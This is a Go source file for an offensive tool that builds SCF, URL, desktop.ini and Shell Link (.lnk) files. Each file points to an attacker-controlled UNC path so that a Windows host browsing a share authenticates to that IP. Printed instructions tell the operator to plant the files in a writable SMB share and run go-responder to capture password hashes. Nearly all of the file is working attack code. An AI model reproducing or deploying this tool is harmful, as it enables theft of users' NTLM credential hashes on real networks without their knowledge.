package lnkgen

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"path/filepath"
)

// GenerateTriggerFiles creates SCF, URL, desktop.ini, and LNK trigger files
// in outDir that force a browsing Windows host to authenticate to ip.
func GenerateTriggerFiles(ip net.IP, outDir string) error {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return fmt.Errorf("mkdir: %w", err)
	}
	ipStr := ip.String()
	unc := fmt.Sprintf(`\\%s\share`, ipStr)

	files := []struct {
		name    string
		content []byte
	}{
		{
			"@trigger.scf",
			[]byte(fmt.Sprintf("[Shell]\r\nCommand=2\r\nIconFile=%s\\@trigger.ico\r\n[Taskbar]\r\nCommand=ToggleDesktop\r\n", unc)),
		},
		{
			"@trigger.url",
			[]byte(fmt.Sprintf("[InternetShortcut]\r\nURL=file://%s/x\r\nIconFile=%s\\@trigger.ico\r\n", ipStr, unc)),
		},
		{
			"desktop.ini",
			[]byte(fmt.Sprintf("[.ShellClassInfo]\r\nIconResource=%s\\@trigger.ico,0\r\n[ViewState]\r\nFolderType=Generic\r\n", unc)),
		},
	}

	for _, f := range files {
		path := filepath.Join(outDir, f.name)
		if err := os.WriteFile(path, f.content, 0644); err != nil {
			return fmt.Errorf("write %s: %w", f.name, err)
		}
		fmt.Printf("[+] Created: %s\n", path)
	}

	lnkData := BuildLNK(unc)
	lnkPath := filepath.Join(outDir, "@trigger.lnk")
	if err := os.WriteFile(lnkPath, lnkData, 0644); err != nil {
		return fmt.Errorf("write @trigger.lnk: %w", err)
	}
	fmt.Printf("[+] Created: %s\n", lnkPath)
	fmt.Printf("[*] UNC path used: %s\n", unc)
	fmt.Println("[*] Place these files in a writable SMB share.")
	fmt.Println("[*] Start go-responder on your interface to capture hashes when a user browses the share.")
	return nil
}

// BuildLNK builds a minimal Shell Link (.lnk) file referencing a UNC path (MS-SHLLINK).
func BuildLNK(uncPath string) []byte {
	hdr := make([]byte, 76)
	binary.LittleEndian.PutUint32(hdr[0:], 0x0000004C)
	copy(hdr[4:], []byte{
		0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
	})
	binary.LittleEndian.PutUint32(hdr[20:], 0x00000001)
	binary.LittleEndian.PutUint32(hdr[24:], 0x00000020)
	binary.LittleEndian.PutUint32(hdr[64:], 0x00000001)

	uncBytes := []byte(uncPath + "\x00")
	deviceBytes := []byte("\x00")
	cnrHeaderSize := uint32(5 * 4)
	cnrSize := cnrHeaderSize + uint32(len(uncBytes)) + uint32(len(deviceBytes))
	for cnrSize%4 != 0 {
		cnrSize++
	}
	cnr := make([]byte, cnrSize)
	binary.LittleEndian.PutUint32(cnr[0:], cnrSize)
	binary.LittleEndian.PutUint32(cnr[4:], 0x00000001)
	binary.LittleEndian.PutUint32(cnr[8:], cnrHeaderSize)
	binary.LittleEndian.PutUint32(cnr[12:], 0)
	binary.LittleEndian.PutUint32(cnr[16:], 0x001A0000)
	copy(cnr[cnrHeaderSize:], uncBytes)
	copy(cnr[cnrHeaderSize+uint32(len(uncBytes)):], deviceBytes)

	liHeaderSize := uint32(28)
	cnrOffset := liHeaderSize
	suffixOffset := cnrOffset + cnrSize
	commonPathSuffix := []byte("\x00")
	liSize := suffixOffset + uint32(len(commonPathSuffix))
	for liSize%4 != 0 {
		liSize++
	}
	li := make([]byte, liSize)
	binary.LittleEndian.PutUint32(li[0:], liSize)
	binary.LittleEndian.PutUint32(li[4:], liHeaderSize)
	binary.LittleEndian.PutUint32(li[8:], 0x00000002)
	binary.LittleEndian.PutUint32(li[12:], 0)
	binary.LittleEndian.PutUint32(li[16:], 0)
	binary.LittleEndian.PutUint32(li[20:], cnrOffset)
	binary.LittleEndian.PutUint32(li[24:], suffixOffset)
	copy(li[cnrOffset:], cnr)
	copy(li[suffixOffset:], commonPathSuffix)

	var lnk []byte
	lnk = append(lnk, hdr...)
	lnk = append(lnk, li...)
	return lnk
}
